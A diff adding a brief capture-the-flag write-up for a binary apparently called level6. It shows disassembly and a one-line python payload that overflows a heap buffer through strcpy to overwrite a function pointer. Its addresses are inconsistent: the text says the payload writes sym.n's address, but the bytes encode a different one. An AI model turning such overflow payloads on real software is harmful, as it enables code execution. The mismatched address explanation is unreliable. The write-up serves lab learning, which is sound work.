@@ -1,0 +1,15 @@
+In the main we can see two consecutive mallocs, they could be contiguous making strcpy exploitable down the road.
+
+|           0x080484c5      sym.imp.strcpy ()                          ; char *strcpy(char *dest, const char *src)
+|           0x080484ca      eax = dword [var_18h]
+|           0x080484ce      eax = dword [eax]
+|           0x080484d0      eax ()
+
+After the strcpy, the function pointed by var_18h is called, it defaults to 0x8048468 == sym.n.
+
+The goal is to overwrite var_18h, since the strcpy takes the arg as src we can overflow dest and access to var_18h.
+
+We can do this easylly by overflowing the dest malloc into var_18h by printing the target address (sym.n) enough times
+
+./level6 "`python -c 'import sys; sys.stdout.write("\x54\x84\x04\x08" * 42)'`"
+
